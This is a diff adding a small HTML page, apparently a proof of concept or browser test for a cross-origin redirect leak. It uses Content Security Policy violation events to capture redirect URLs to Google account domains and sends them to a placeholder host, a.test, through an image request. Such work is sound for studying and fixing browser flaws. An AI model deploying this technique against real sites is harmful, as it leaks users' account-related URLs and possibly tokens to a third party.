@@ -1,0 +1,13 @@
+<img src="https://bugs.chromium.org/bug_attachment" />
+<script>
+    document.addEventListener('securitypolicyviolation', function(e) {
+        if (e.blockedURI.indexOf('accounts.google.com') !== -1 || e.blockedURI.indexOf('googleusercontent.com') !== -1) {
+            reportRedirectLeak(e.blockedURI);
+        }
+    });
+
+    function reportRedirectLeak(blockedURI) {
+        var reportURL = 'https://a.test/report/?leak=c932892&blockedURI=' + encodeURIComponent(blockedURI);
+        document.createElement('img').src = reportURL;
+    }
+</script>
